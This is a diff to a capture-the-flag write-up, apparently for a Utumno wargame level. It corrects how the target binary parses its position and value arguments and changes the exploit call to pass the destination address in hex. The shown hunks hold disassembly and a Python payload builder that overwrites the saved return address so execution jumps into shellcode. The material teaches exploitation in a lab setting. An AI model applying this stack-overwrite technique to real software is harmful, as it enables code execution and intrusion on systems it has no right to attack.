@@ -843,7 +843,7 @@ Verification: each password was accepted by logging in as the next level's accou
    80491d8: call malloc                    ; buf = malloc(0x20)
    8049206: push 0x10 ; push 0 ; push argv[1] ; call strtoul   ; pos, base 16? no:
    ```
-   the second `strtoul` (`8049223`) uses base 10 for `argv[1]` and the first uses base 16 for `argv[2]`; the order in the source is `value = strtoul(argv[2],0,16); pos = strtoul(argv[1],0,10)`. Then:
+   `argv[2]` (the value) is parsed with base **16** and `argv[1]` (the position) with base **10** — a detail that bites later: writing the destination address as a decimal string makes `strtoul(...,0,16)` stop early and the pointer becomes `0xffffffff`. Then:
    ```
    804922e: cmp DWORD PTR [ebp-0x8],0xa    ; signed compare of pos
    8049232: jle 8049248                    ; <= 10 -> continue
@@ -942,8 +942,11 @@ Verification: each password was accepted by logging in as the next level's accou
    DST  = EBP + 4           # the saved return address slot
    CODE = EBP + 8           # the shellcode lands right after the pointer
    payload = struct.pack("<I", CODE) + sc
-   argv = ["/utumno/utumno6", "4294967295", str(DST), payload]
+   argv = ["/utumno/utumno6", "4294967295", hex(DST), payload]
    ```
+   `hex(DST)` matters: `argv[2]` is parsed with base 16, so a decimal string
+   would be read as far as its leading `0x`-less digits and the pointer would
+   come out as `0xffffffff` (the first run failed exactly this way).
    `strcpy` writes `payload` to `ebp+4`: the first four bytes become the return address (`ebp+8`), and the shellcode follows immediately at `ebp+8`. `leave; ret` then jumps straight into it — no separate stack pivot needed.
 8. **Run it.**
    ```
